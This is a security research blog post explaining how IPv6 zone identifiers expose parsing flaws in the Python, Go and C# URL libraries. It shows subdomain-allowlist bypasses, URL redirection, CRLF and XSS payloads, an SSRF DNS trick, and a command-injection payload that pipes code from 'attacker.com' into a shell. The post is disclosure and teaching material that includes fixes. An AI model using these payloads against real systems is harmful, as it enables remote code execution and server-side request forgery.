---
title: 'Exploring IPv6 Zone Identifier : Unveiling Vulnerabilities in Popular Programming Languages'
date: 2024-01-11T09:27:11-05:00
tags: [security+]
---
# Introduction
This article is dedicated to a series of tricks utilizing the modern capabilities of IPv6 and the shortcomings of address parser implementations in standard libraries of popular programming languages.

# IPv6 Zone
I think many people have an idea of what IPv6 and IPv4 addresses look like:

```
2001:0db8:85a3:0000:0000:8a2e:0370:7334 - IPv6
192.168.0.1 - IPv4

```
When including an IPv6 address in a URL, it needs to be enclosed in square brackets []:

```
http://[::1]/path?query=value#fragment

```
But many people forget about the Zone_ID concept in IPv6, let's check [RFC](https://datatracker.ietf.org/doc/html/rfc6874#section-3):

```
In a URI, a literal IPv6 address is always embedded between "[" and
"]".  This document specifies how a <zone_id> can be appended to the
address.  According to URI syntax [RFC3986], "%" is always treated as
an escape character in a URI, so, according to the established URI
syntax [RFC3986] any occurrences of literal "%" symbols in a URI MUST
be percent-encoded and represented in the form "%25".  Thus, the
scoped address fe80::a%en1 would appear in a URI as
http://[fe80::a%25en1].

```
Many will be surprised, but this is a valid IPv6 address:

```
[::1%Cherry]

```
# Whitelisted subomains

## Golang and Python
Let's consider the URL `http://[::1]/`. If I try to extract the hostname in different languages, we'll get different results:

```
Go(Hostname), Python - ::1
Go(Host),C#, Java, PHP - [::1]

```
As seen in Go and Python, the IPv6 address will be returned without the square brackets []. To understand the potential issues this might cause, let's consider some code examples:
Python
```
from urllib.parse import urlparse

def is_subdomain_of_example(url_string):
    parsed_url = urlparse(url_string)
    if parsed_url.hostname:
        print(parsed_url.hostname)
        host_parts = parsed_url.hostname.split('.')
        if len(host_parts) >= 3 and host_parts[-2:] == ['example', 'com']:
            return True
    return False

def main():
    url = "..."
    if is_subdomain_of_example(url):
      print(url, "is a subdomain of example.com")
    else:
      print(url, "is not a subdomain of example.com")

if __name__ == "__main__":
    main()

```

And golang:
```
package main

import (
	"fmt"
	"net/url"
	"strings"
)

func isSubdomainOfExample(urlString string) bool {
	parsedURL, err := url.Parse(urlString)

	if err != nil {
		fmt.Println("Error:", err)
		return false
	}

	hostParts := strings.Split(parsedURL.Hostname(), ".")
	if len(hostParts) >= 3 && hostParts[len(hostParts)-2] == "example" && hostParts[len(hostParts)-1] == "com" {
		return true
	}
	return false
}

func main() {
	urlToCheck := "..."
	if isSubdomainOfExample(urlToCheck) {
		fmt.Println(urlToCheck, "is a subdomain of example.com")
	} else {
		fmt.Println(urlToCheck, "is not a subdomain of example.com")
	}
}

```

The essence of these code examples is roughly the same; they check whether the passed URL is a subdomain of example.com (a common method by splitting the URL based on dots).

Let's leverage our knowledge of IPv6 Zone Identifier and use the following line:

```
https://[::1%25.example.com]

```

In both cases, I will see output:

```
http://[::1%25.example.com] is a subdomain of example.com

```
But if I execute requests to these addresses, they will be executed against the address `[::1]`.

To make this logic safer, you just need to use `.netloc` in Python and `.Host` in Go. (These methods returns addresses in `[]`)

## C#
While I was testing this vector, I decided to look into how it's implemented in the standard C# library. As mentioned earlier, C# returns the address without [], but it turned out that besides Host, there's also DnsSafeHost, which is susceptible to the same issue.
```
using System;
using System.Net.Http;
using System.Threading.Tasks;

class Program
{
    static async Task<bool> IsSubdomainOfExampleAsync(string urlString)
    {
            Uri uri = new Uri(urlString);

            string[] hostParts = uri.DnsSafeHost.Split('.');
            if (hostParts.Length >= 3 && hostParts[^2] == "example" && hostParts[^1] == "com")
            {
                    return true;
            }
        return false;
    }

    static async Task Main()
    {
        string urlToCheck = "http://[::1%25.example.com]";
        if (await IsSubdomainOfExampleAsync(urlToCheck))
        {
            Console.WriteLine(urlToCheck + " is a subdomain of example.com");
        }
        else
        {
            Console.WriteLine(urlToCheck + " is not a subdomain of example.com");
        }
    }
}

```


# ip_address and Injections
`ipaddress.ip_address` is the most common way to parse IP addresses in Python.

```
>>> import ipaddress
>>> ipaddress.ip_address('::1%Cherry')
IPv6Address('::1%Cherry')
>>> print(ipaddress.ip_address('::1%Cherry'))
::1%Cherry

```

We've confirmed that the library returns the Zone Identifier. It's important to understand that many developers are not aware of this behavior, which leads to injections.

A few real-life examples:
## URL formating
Example:
```
addr = ipaddress.ip_address('::1%61]@example.com#')
url = f"https://[{addr}]:80/info"

```
In such cases, it's possible to bypass the brackets `[]` and redirect the request using `@` to a destination different from what the developer expects.
Also works with `parsed_url._replace`:

```
parsed_url._replace(netloc="[::1%61]@example.com")

```

## RCE
In some cases (if you're very lucky), this can lead to the possibility of executing code:

```
os.system(f"ping -c 1 {addr} > ./file")

```

I can't use the "/" symbol, but it's still possible to execute code:

```
>>> ipaddress.ip_address('::1%;curl attacker.com | sh;')
IPv6Address('::1%;curl attacker.com | sh;')

```

## Another
It's important to understand that achieving CRLF is also possible in some use cases:

```
>>> ipaddress.ip_address('::1%\r\nasd')
IPv6Address('::1%\r\nasd')

```
Also you can try to get XSS with:

```
https://[::1%<h1>cherry<h1>]

```
Python will parse hostname as:
```
::1%<h1>cherry<h1>

```

Also, it is important to understand that:

```
>>> ipaddress.ip_address('::1%a') == ipaddress.ip_address('::1%b')
False

```

When comparing, I will find that these are different addresses, but it is the same address, only leading through different zones. In some cases, this allows bypassing blacklist checks.

In fact, this provides ample room for attacks, as developers rarely consider that an IPv6 address could contain any injection. I won't enumerate other possibilities.

# Golang, golang...
Finally, I want to delve further into parsing the Zone Identifier in Golang and why it's unique.
Let's dive into [sources](https://github.com/golang/go/blob/58c5db3169c801737cb0e0ed4886554763c861eb/src/net/url/url.go#L642C3-L656C37):

```
zone := strings.Index(host[:i], "%25")
	if zone >= 0 {
		host1, err := unescape(host[:zone], encodeHost)
		if err != nil {
			return "", err
		 }
		host2, err := unescape(host[zone:i], encodeZone)
		if err != nil {
			return "", err
		 }
		host3, err := unescape(host[i:], encodeHost)
		if err != nil {
			return "", err
		 }
	    return host1 + host2 + host3, nil

```
Here it can be noticed that Golang uses URL decoding for the passed Zone Identifier.
Let's take a closer look at how it works.

```
urlToCheck := "http://[::1%2561%5d%3c%3e]"
parsedURL, err := url.Parse(urlToCheck)
if err != nil {
	fmt.Println("Error:", err)
 }
fmt.Println(parsedURL.Hostname())
fmt.Println(parsedURL.Host)

```
Will output:

```
::1%61]<>
[::1%61]<>]

```
( Yeah, I can close `[]` :))
You can use this for attacks based on IP parsing differences.

You might have also noticed that net/url simply searches for the first occurrence of %25 in the hostname. This behavior does not comply with the standards.

```
urlToCheck := "http://[%2561]"
parsedURL, err := url.Parse(urlToCheck)
if err != nil {
fmt.Println("Error:", err)
}
fmt.Println(parsedURL.Hostname())
fmt.Println(parsedURL.Host)
/*
Output:%61
      [%61]
*/

```

It may seem to provide little benefit, but it can be exploited with another incorrect implementation in net/url.

```
urlToCheck := "http://[%2561.google.com]"
...

/*
Output: %61.google.com
       [%61.google.com]
*/

```

In some cases, this can help you achieve SSRF. It's enough to set up a server where `%61.attacker.com` responds with a global address, while a.attacker.com responds with `127.0.0.1`. In rare cases, you may be lucky enough to achieve SSRF.

# Conclusion
In conclusion, I would like to say that the IPv6 Zone Identifier is useful because most developers believe that the IP address is a structure with a stricter format than it actually is. This misconception opens up a significant opportunity for attacks that are underestimated by the cybersecurity community.

It's also worth noting that all designed parsers (supporting IPv6 Zone) have different implementations and parse addresses differently. I didn't spend much time studying this topic; perhaps someone else can come up with many more interesting aspects related to this trick.
